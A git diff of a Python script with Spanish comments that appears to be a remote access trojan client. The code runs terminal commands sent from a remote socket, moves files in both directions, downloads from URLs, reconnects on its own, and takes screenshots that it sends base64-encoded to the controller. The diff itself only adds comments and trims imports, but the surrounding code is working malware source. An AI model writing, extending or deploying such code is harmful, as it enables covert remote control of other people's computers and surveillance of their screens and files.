@@ -6,6 +6,9 @@
 #os => directorios
 #subprocess => comandos terminal
 #base64 => conversion binaria
+#mss => captura de pantalla
+#time => libreria para tiempo 
+
 import socket
 import os
 import subprocess
@@ -13,9 +16,6 @@ import base64
 import requests
 import mss
 import time
-import shutil
-import sys
-
         
 def shell(): #funcion para la ejecución de comandos, directorio, exit, cd, --descargar, --cargar
     directorio_actual = os.getcwd()
@@ -48,7 +48,7 @@ def shell(): #funcion para la ejecución de comandos, directorio, exit, cd, --de
             try:
                 captura_pantalla()
                 with open('monitor-1.png','rb') as archivo_enviado:
-                    cliente.send(base64.b64encode(archivo_enviado.read()))
+                    cliente.send(base64.b64encode(archivo_enviado.read())) 
                 os.remove("monitor-1.png")
             except:
                 cliente.send(base64.b64encode("fallo"))
@@ -70,7 +70,7 @@ def conexion():
             conexion()      
 
 def captura_pantalla():
-    screen = mss.mss()
+    screen = mss.mss() #instancia de mss
     screen.shot()
     
 def descargar_archivo(url):
